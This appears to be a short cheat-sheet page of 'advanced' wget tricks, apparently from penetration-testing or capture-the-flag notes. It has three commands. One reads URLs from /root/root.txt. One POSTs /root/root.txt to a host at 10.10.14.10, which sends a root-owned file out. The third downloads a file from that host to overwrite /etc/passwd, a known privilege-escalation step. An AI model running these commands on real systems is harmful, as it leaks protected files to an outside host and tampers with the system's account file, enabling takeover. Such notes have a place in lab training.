---
title: "Advance wget"
date: 2024-7-5
tags: ["wget", "file transfer", "http", "web"]
---

---
### Advance wget

```bash
# Provide a file with urls
wget --input-file /root/root.txt
```

```bash
# POST a file
wget --post-file /root/root.txt http://10.10.14.10
```

```bash
# Overwrite a file
wget http://10.10.14.10/passwd.txt -O /etc/passwd
```

<br>